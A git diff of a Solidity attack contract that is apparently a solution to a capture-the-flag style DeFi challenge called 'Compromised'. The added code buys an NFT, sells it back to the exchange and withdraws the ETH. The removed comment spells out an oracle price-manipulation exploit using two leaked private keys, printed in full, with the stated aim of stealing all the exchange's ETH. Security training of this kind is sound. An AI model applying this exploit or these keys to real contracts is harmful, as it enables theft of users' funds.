@@ -1,10 +1,26 @@
 // SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.17;
 
-pragma solidity 0.8.19;
+import {Address} from "openzeppelin-contracts/utils/Address.sol";
+import {IExchange} from "./Interfaces/IExchange.sol";
+import {IERC721} from "openzeppelin-contracts/interfaces/IERC721.sol";
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
+import {IERC721Metadata} from "openzeppelin-contracts/token/ERC721/extensions/IERC721Metadata.sol";
 
-contract CompromisedAttack{
-    address internal ExchangeAddress;
-    address internal owner;
+
+
+
+// need an interface for the contract
+contract CompromisedAttack is IERC721Receiver {
+
+
+    IExchange internal Exchange;
+    IERC721 internal dvnft;
+
+
+    address payable internal owner;
+    uint256 tokenID; 
+
 
     error NotOWner();
 
@@ -12,35 +28,39 @@ contract CompromisedAttack{
         if(msg.sender != owner) revert NotOWner();
         _;
     }
-    // constructor initializes exchange contract and ownr
 
-    // function to buyDiscount 
+    // constructor initializes exchange contract and ownr
+    constructor(address _ExchangeAddress, address _owner, address _dvnftAddress){
+        owner = payable(_owner);
+        Exchange = IExchange(_ExchangeAddress);
+        dvnft = IERC721(_dvnftAddress);
+    }
+
+    function buyDiscountedNFT() payable external onlyOwner{
+       tokenID = Exchange.buyOne{value: msg.value}();
+
+       // once bought we need to approve the exhange address the ability to move the nft
+       dvnft.approve(address(Exchange), tokenID);
+    }
 
     // function to sellProfit
+    function cashOut() external onlyOwner {
+        Exchange.sellOne(tokenID);
+    }
 
+    function withdraw() external onlyOwner {
+        (bool success, bytes memory __) = payable(owner).call{value: address(this).balance}("");
+        require(success, "something went wrong");
+    }
+
+    function onERC721Received(address operator, address from, uint256 tokenID, bytes calldata data) external override returns (bytes4){
+        return IERC721Receiver.onERC721Received.selector;
+    }
+        
 
     // function to withdraw eth to onlyOwner
+    receive() external payable {}
+
+    //@note Need to implement an NFT receiver so that this contract can recieve the nft
 
 }
-
-/**
- * ATTACk Objective: 
- * Steal all the ETH available in the exchange 
- * 
- * Arhitecture details:
- * exchange is selling overpriced collectables of DVNFT at 999ETH 
- * 
- * Attack POC: 
- * 
- * Convert https request from hexadecimal and then from base64 to recieve the private key  using cyberchef (remove the 0x)
- * 
- * Use cast wallet address --private-key <private-key> to get the wallet address 
- * Priv key 1 = c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9 = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
- * PRiv key 2 = 208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48 = 0x81A5D6E50C214044bE44cA0CB057fe119097850c
- * 
- * 1. Now we can post some faulty prices for the nft to the oracle using those keys
- * 2. Buy the nft at 1 wei 
- * 3. post the actual price for the nft 
- * 4. Sell the nft for 99 eth
- * Exploit complete
- */
